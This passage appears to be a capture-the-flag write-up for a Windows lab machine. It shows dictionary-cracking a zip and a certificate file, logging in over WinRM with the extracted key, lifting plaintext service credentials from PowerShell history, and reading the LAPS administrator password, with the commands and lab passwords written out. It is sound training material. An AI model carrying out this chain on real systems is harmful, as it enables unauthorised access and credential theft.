```
SMB         10.129.227.105  445
smbclient //{IP}/Share
```

In Dev folder I have found an interesting zip file.

**fcrackzip or zip2john** for brute forcing the zip files.
```
fcrackzip --use-unzip --dictionary --init-password /usr/share/wordlists/rockyou.txt winrm_backup.zip

PASSWORD FOUND!!!!: pw == supremelegacy
```
Zip password is `supremelegacy`.

**crackpkcs12 or pfx2john** for brute forcing .pfx or .p12 files.
```shell
crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx

Dictionary attack - Starting 12 threads

*********************************************************
Dictionary attack - Thread 3 - Password found: thuglegacy
*********************************************************
```

To extract the crt and key files in .pem format from the legacyy_dev_auth.pfx file, you can use the following openssl command:

```shell
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out legacyy_dev_auth.key.pem
```

This will create two separate files: legacyy_dev_auth.crt.pem containing the certificate and legacyy_dev_auth.key.pem containing the private key.

WinRM http runs on 5985 and SSL on 5986
Because http is not open, let's connect with https using -S flag:
```
evil-winrm -i 10.129.227.105 -k /home/volt/htb/timelapse/legacyy_dev_auth.key.pem  -c /home/volt/htb/timelapse/legacyy_dev_auth.crt.pem -S
```

# Privilege Escalation

History file of powershell
https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
```
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type "C:/Users/legacyy/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

After login in with winrm with new credentials,

```
evil-winrm -i 10.129.227.105 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

net user svc_deploy
```

The output of the previous command shows that we are part of the LAPS_Readers group. The
"Local Administrator Password Solution" (LAPS) is used to manage local account passwords of
Active Directory computers.

```
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *

# Result
ms-Mcs-AdmPwd                        : pt80xJ4hC[HI(;+#08MU&h{F
```

Logging in as Administrator and searching for root.txt flag
```
evil-winrm -S -i 10.129.64.108 -u 'administrator' -p 'pt80xJ4hC[HI(;+#08MU&h{F'

Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force
```

LAPS password with proper credentials can be achieved also by using this python script:
https://github.com/n00py/LAPSDumper/tree/main
